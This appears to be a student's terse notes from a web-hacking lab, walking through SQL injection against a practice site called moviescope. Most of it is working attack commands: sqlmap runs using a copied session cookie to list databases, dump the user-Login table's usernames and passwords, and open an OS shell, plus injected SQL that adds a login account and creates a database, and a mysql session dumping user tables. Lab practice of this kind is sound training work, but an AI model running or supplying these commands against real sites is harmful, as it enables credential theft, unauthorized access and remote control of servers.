Tools 
1) N staltker web vuln analysis
2) In the vuln web app go to console type document.cookie
	1) get the cookie value
	2) `sqlmap -u "http://IP?id=?" --cookie="X" --dbs`
to insert a username into the database we can user
`blah;insert into login values ('john',apple123');--`

then login using john as user  and apple123 as pass


To create a database 
`blah;create database mydatabase;--`  



https://www.youtube.com/watch?v=iD84waJKYh0


SQL MAP

Open the vulnerable website 
Copy the cookie from the inspect element
Open the terminal to use sqlmap 
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl="; --dbs
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moveiscope --tables
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" -D moviescope -T user-Login --dump

You will get all the Useraname and Passwords of the website.

------------------------------------------------------------------------------------------------------------------------------------------------------

sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" --os-shell
It opens up the Interactive OS shell.

-------------------------------------------------------------------------------------------------------------------------------------------------------

mysql -U qdpmadmin -h 192.168.1.8 -P passwod 
show databases;
use qdpm;
show tables'
select * from users;
show dtabases;
use staff;
show tables;
select * from login;
select * from user;

When you have username and Password for the database.
